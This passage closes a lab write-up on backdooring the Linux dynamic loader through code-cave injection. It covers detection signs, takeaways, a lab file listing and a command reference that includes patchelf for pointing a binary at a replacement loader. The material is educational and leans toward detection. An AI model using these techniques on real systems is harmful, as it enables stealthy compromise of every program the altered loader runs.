│      Watch for:                                                             │
│        • File creation before main() (e.g., /tmp/PWNED*)                    │
│        • Network connections during loader phase                            │
│        • Unusual syscalls from ld-linux process                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 10. Conclusion

### 10.1 Key Takeaways

1. **The dynamic linker is a critical attack surface** - it runs before every dynamically-linked program

2. **Code cave injection preserves file size** - harder to detect than file appending

3. **The attack is completely transparent** - programs run normally after payload execution

4. **Hash verification is essential** - the most reliable detection method

5. **Requires initial access** - either root (system loader) or user (per-binary)

### 10.2 Connection to Your Studies

This lab directly applies concepts from your notes:

| Note File | Concept Applied |
|-----------|-----------------|
| `01-memory-layout-deep-dive.md` | TEXT segment (code injection), segment permissions |
| `01a-elf-program-headers-deep-dive.md` | PT_INTERP, PT_LOAD segments, entry point |
| `01b-process-execution-flow-visualized.md` | Loader execution before _start, kernel → loader → program flow |

### 10.3 Further Research

- **Kernel-level detection**: eBPF programs to monitor loader behavior
- **Static binary linking**: Eliminates loader dependency (but increases binary size)
- **Loader hardening**: Techniques to verify loader integrity at runtime
- **Related attacks**: LD_PRELOAD injection, GOT/PLT hijacking, .init_array attacks

---

## Appendix A: Complete File Listing

```
/home/spider/trojanized-loader-lab/
├── victim.c                  # Source code (1,208 bytes)
├── victim                    # Clean binary (16,136 bytes)
├── victim_evil               # Patched binary (16,841 bytes)
├── ld-evil.so.2             # Original loader copy (236,616 bytes)
├── ld-trojanized.so.2       # Modified loader (236,616 bytes)
├── patch_loader.py          # Patcher script (16,820 bytes)
└── TROJANIZED_LOADER_ATTACK.md  # This document
```

---

## Appendix B: Commands Reference

```bash
# Analyze ELF interpreter
readelf -l <binary> | grep interpreter

# Disassemble at specific address
objdump -d <binary> --start-address=0xXXXX --stop-address=0xYYYY

# Hex dump at offset
xxd -s <offset> -l <length> <binary>

# Compare binary hashes
sha256sum <binary1> <binary2>

# Patch binary interpreter
patchelf --set-interpreter <new_path> <binary>

# Verify package integrity
dpkg -V <package>
rpm -V <package>
```

---

**Document Version:** 1.0
**Last Updated:** 2025-12-21
**Classification:** Educational / Security Research

---

*This document is for educational purposes only. The techniques described should only be used in authorized security research, penetration testing, or educational environments.*
